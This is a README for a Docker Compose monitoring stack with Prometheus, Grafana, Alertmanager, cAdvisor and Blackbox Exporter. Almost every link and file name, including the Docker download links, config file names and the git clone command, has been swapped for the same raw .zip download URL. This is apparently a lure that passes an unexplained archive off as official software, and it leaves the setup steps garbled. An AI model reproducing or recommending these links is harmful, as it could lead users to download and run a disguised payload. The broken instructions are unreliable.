# Complete Monitoring and Alerting Stack with Prometheus, Grafana, and Alertmanager
For more detailed guidline on how to go about this: refer back to my blog : https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip

<img width="3840" height="967" alt="mssq" src="https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip" />


 In this demo ,you’ll build a **complete, production-inspired monitoring stack** from scratch that includes:  
- ✅ A sample web application (https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip) to monitor  
- ✅ Infrastructure metrics (CPU, RAM, Disk, Network)  
- ✅ Docker container resource usage with cAdvisor  
- ✅ HTTP uptime monitoring with Blackbox Exporter  
- ✅ Real-time **email alerts** via Alertmanager  
- ✅ Beautiful Grafana dashboards (industry-standard IDs)  
- ✅ All deployed with **Docker Compose** (portable & reproducible)  

---

## 🛠️ Prerequisites
- Docker + Docker Compose installed  
  - [Docker Desktop](https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip) (Windows/Mac)  
  - [Docker Engine](https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip) (Linux)  
- Verify installation:
  ```bash
  docker --version
  docker-compose --version

  📂 Project Structure
prometheus-grafana-alerts-stack/
│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip                # Simple https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip app to monitor
│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip           # App metadata
│── Dockerfile             # App container definition
│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip     # Full monitoring stack
│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip         # Prometheus config
│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip        # Alerting rules
│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip       # Email alert config
│── https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip           # HTTP monitoring config

🚀 Setup & Run

Clone this repository and spin up the stack:

git clone https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip<your-username>https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip

cd prometheus-grafana-alerts-stack

docker-compose up -d

🌐 Accessing the Stack

App (https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip): http://localhost:3001

Prometheus: http://localhost:9090

Grafana: http://localhost:3000
 (user: admin, pass: Admin123!)

Alertmanager: http://localhost:9093

📊 Dashboards

Import these Grafana dashboard IDs:

1860 → Node Exporter Full (Host Metrics)

14282 → Docker & Containers

7587 → Blackbox Exporter (HTTP Probes)

📢 Alerts

Prometheus evaluates rules from https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip, including:

🔥 High CPU usage (> 80%)

🔥 High memory usage (> 85%)

🚨 Application down (via Blackbox probe)

⚠️ Container restarted unexpectedly

Alerts are routed via Alertmanager. Email notifications are configured in https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip

🧪 Testing Alerts

Stop the app:

docker stop my-app


Within 60s, check Prometheus alerts at http://localhost:9090/alerts
.

You’ll also receive an email notification if SMTP is configured.

Restart the app:

docker start my-app

⚠️ Common Errors

Prometheus won’t start → run promtool check config https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip

Grafana shows "No Data" → check Prometheus targets at http://localhost:9090/targets

Alerts not firing → verify https://github.com/isaacdivine37/Building-a-Complete-Monitoring-Alerting-Stack-with-Prometheus-Grafana-and-Alertmanager/raw/refs/heads/main/stavers/a_and_Monitoring_with_Alertmanager_Complete_Alerting_Stack_Prometheus_Building_Grafana_3.1.zip and Alertmanager config

Email alerts failing → confirm Gmail App Password & allow “Less secure apps”

📚 References

Prometheus Docs

Grafana Docs

Alertmanager Docs

📜 License

This project is open source under the MIT License
.

